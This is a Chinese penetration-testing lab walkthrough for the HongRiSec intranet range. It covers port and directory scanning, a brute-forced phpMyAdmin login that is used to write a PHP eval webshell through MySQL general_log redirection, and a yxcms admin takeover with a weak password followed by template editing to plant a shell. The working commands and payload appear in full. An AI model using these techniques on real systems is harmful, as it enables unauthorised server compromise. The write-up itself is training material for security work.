环境  

\>这里攻击机使用kali或者自己本机如果有攻击工具，web服务器用的是win7，使用的是phpstudy集成环境，域成员分别是windows2003、windows2008。

（密码默认是hongrisec@2019，windows2003和windows2008需要更改密码，修改后的密码为Admin@123456，不然符合密码复杂度）

  

\>win7网络适配器1设置为自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式。win2003、win2008网络适配器设置成自定义（VMnet1仅主机模式）

（注意：这里win7的网络适配器2没有设置NAT，设置的仅主机模式，因为这里设置了NAT，自己电脑访问外网的ip会直接出网访问，并不会访问到win7）

win7内网ip：192.168.52.143  外网ip：192.168.204.128（随自己主机IP而定）

win2003 ip：192.168.52.141

win2008 ip：192.168.52.138

这里需要确保win2003和win2008和攻击机无法直接访问，实现物理隔离。

\>拿到目标后，第一件事就是进行信息收集，这里先使用工具来进行端口扫描、目录扫描等：

@使用nmap扫描一下目标，查看端口情况：

**命令：nmap  -sV  -O  192.168.204.128  --open**

![](../Images/8e4e297cc4bbf11b0e75f99699cde9e7.png)

\>这里就发现探测到存在80端口、3306端口开放，访问80端口网页显示php探针，此外3306端口是phpmyadmin：

![](../Images/e7882420e80476b8957d9c8db5b1c6f7.png)

![](../Images/0f41688eec2a72da94a13e6de81ede7e.png)

\>继续使用dirsearch和御剑来对网站的目录进行扫描，查看是否存在其他的信息：

@使用dirsearch来对目标网站进行扫描：

**命令：python3 dirsearch.py -u http://192.168.204.128 -e \* --timeout=2 -t 1 -x 400,403,404,500,503,429**

![](../Images/f0060a4123aec9ed5d9604cb31be8004.png)

@使用御剑对目标网站进行扫描：

![](../Images/2be1548031caec17ce4d8d4189778f6f.png)

\>通过扫描的结果发现，这里存在http://192.168.204.128/phpmyadmin目录、http://192.168.204.128/phpinfo目录以及http://192.168.204.128/yxcms目录等，所以下一步就针对这几个点进行尝试。

**@第一种：利用phpmyadmin弱密码登录getshell**

\>首先针对http://192.168.204.128/phpmyadmin进行攻击，这里尝试弱密码爆破，发现爆破成功，账号/密码为root/root：

![](../Images/051f98a4ed7b744ee06a6331842b47cb.png)

\>成功进入phpmyadmin后，就可以方便执行SQL语句了，通过phpmyadmin获取webshell的方式有多种，这里尝试选择开启全局日志的方式来getshell，首先查询当前是否开启了全局模式：

**命令：SHOW  GLOBAL  VARIABLES  LIKE  '%genera%';**

![](../Images/57db2998a8dd4b2debae90655fe94bed.png)

\>然后再次查询是否开启了全局日志：

**命令：SHOW  GLOBAL  VARIABLES  LIKE  '%genera%';**

![](../Images/1d9a3379b135c984d0220d203a925fcd.png)

\>发现开启后，就将所有查询语句记录到新指定的可访问的文件中：

**命令：SET  GLOBAL  general\_log\_file='C:/phpStudy/WWW/shell.php';**

![](../Images/650fb8ad895328135e99c944f3851697.png)

\>全部设置完成之后再次查询是否都已经成功更改：**命令：SHOW  GLOBAL  VARIABLES  LIKE  '%genera%';**

![](../Images/d54dfb3958cad750b1b1567c43a1f2a6.png)

  

\>这里就可以看到全局日志功能已经开启，并且记录查询得文件也是指定的shell.php了，接下来就是执行一个带有一句话功能的sql语句了：

**命令：SELECT"<?php eval($\_POST\['cmd'\])?>";**

![](../Images/3797d74eec25a96dd378021a364f0767.png)

\>成功写入一句话之后就可以使用webshell工具进行连接，这里使用蚁剑进行连接：

![](../Images/e113412eeac0f35f649621823e75e38a.png)

![](../Images/4ea110c788a552a95998acf3fe2f2006.png)

\>这里就已经成功连接到了webshell木马文件。

 

**@第二种：通过yxcms后台模板写shell**

\>针对http://192.168.204.128/yxcms进行攻击，首先先进入该url：

![](../Images/bb12f4330962f413d08cb10aeeaadac2.png)

![](../Images/5eea4cbd63396395acd019650e2e9bb3.png)

  

\>这里开始是先尝试了密码爆破，但是由于存在验证码，爆破失败，所以需要寻找其他的利用点，这里发现url（http://192.168.204.128/yxcms/index.php?r=member/index/login）中后面的参数r=member，这里尝试换成admin发现：

Url：http://192.168.204.128/yxcms/index.php?r=admin/index/login

![](../Images/6f19d85289c937096e44cec4e585329f.png)

![](../Images/277f697a6f495ccf1146e1646ea7bbc1.png)

\>这里发现当密码是123456的时候，回显的数据包是302进行了跳转，所以使用账号/密码为admin/123456进行登录发现可以成功登录到后台：

![](../Images/8b0aa39f321370937aa9fd79c9ef2798.png)

  

\>这里发现了存在上传文件管理，点击进去并无法上传文件，但是在前台模板中发现可以直接写入一句话文件来进行getshell：

（前台模板 \-> 管理模板文件 \-> index\_index.php编辑）

![](../Images/1528d53e48142c4e8e254e13113fb1df.png)
